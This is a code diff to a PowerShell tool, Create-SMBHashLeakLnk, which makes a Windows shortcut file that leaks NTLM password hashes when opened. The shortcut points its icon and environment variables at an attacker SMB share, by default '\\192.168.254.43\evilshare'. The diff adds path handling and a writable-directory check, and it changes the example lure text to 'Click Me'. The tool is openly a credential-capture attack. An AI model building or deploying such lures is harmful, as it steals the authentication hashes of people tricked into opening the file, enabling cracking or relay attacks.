@@ -1,3 +1,5 @@
+# Create-SMBHashLeakLnk.ps1
+
 function Create-SMBHashLeakLnk {
     <#
     .SYNOPSIS
@@ -7,7 +9,7 @@ function Create-SMBHashLeakLnk {
     This function generates a Windows shortcut (LNK) file that, when opened, attempts to connect to a specified SMB share, potentially leaking NTLM hashes. It uses embedded C# code to construct the LNK file with specific attributes, including a description, icon location, and environment variables pointing to the SMB share.
 
     .PARAMETER LnkFilePath
-    The path where the LNK file will be created. Defaults to "poc.lnk" in the current directory.
+    The path where the LNK file will be created. If a relative path is provided, it will be resolved relative to the current directory. Defaults to "poc.lnk".
 
     .PARAMETER SmbSharePath
     The SMB share path (UNC path) to use for the icon location and environment variables. Defaults to "\\192.168.254.43\evilshare\test.exe".
@@ -16,8 +18,12 @@ function Create-SMBHashLeakLnk {
     A description for the LNK file, visible in its properties. Defaults to "NTLM grab".
 
     .EXAMPLE
-    Create-SMBHashLeakLnk -LnkFilePath "C:\Temp\exploit.lnk" -SmbSharePath "\\10.0.0.1\share\fake.exe" -Description "NTLM grab"
-    Creates an LNK file at "C:\Temp\exploit.lnk" that points to "\\10.0.0.1\share\fake.exe" with the description "NTLM grab".
+    Create-SMBHashLeakLnk -LnkFilePath "C:\Temp\exploit.lnk" -SmbSharePath "\\10.0.0.1\share\fake.exe" -Description "Click Me"
+    Creates an LNK file at "C:\Temp\exploit.lnk" that points to "\\10.0.0.1\share\fake.exe" with the description "Click Me".
+
+    .EXAMPLE
+    Create-SMBHashLeakLnk
+    Creates an LNK file named "poc.lnk" in the current directory with default settings.
 
     .NOTES
     Requires PowerShell 7 or later due to the use of Array.Fill and .NET 6+ features.
@@ -34,6 +40,25 @@ function Create-SMBHashLeakLnk {
         [Parameter(Mandatory = $false)]
         [string]$Description = "NTLM grab"
     )
+
+    # Resolve the LnkFilePath to an absolute path if it's relative
+    if (-not [System.IO.Path]::IsPathRooted($LnkFilePath)) {
+        $LnkFilePath = Join-Path -Path (Get-Location).Path -ChildPath $LnkFilePath
+    }
+
+    # Validate that the directory is writable
+    $lnkDir = [System.IO.Path]::GetDirectoryName($LnkFilePath)
+    if (-not $lnkDir) {
+        $lnkDir = (Get-Location).Path
+    }
+    try {
+        $testFile = Join-Path -Path $lnkDir -ChildPath ([System.IO.Path]::GetRandomFileName())
+        [System.IO.File]::WriteAllText($testFile, "test")
+        Remove-Item -Path $testFile -Force
+    }
+    catch {
+        throw "Cannot write to directory '$lnkDir'. Access is denied or the path is invalid. Please specify a writable directory for LnkFilePath."
+    }
 
     # Define the path for the temporary C# file
     $tempCsFile = [System.IO.Path]::GetTempFileName() + ".cs"
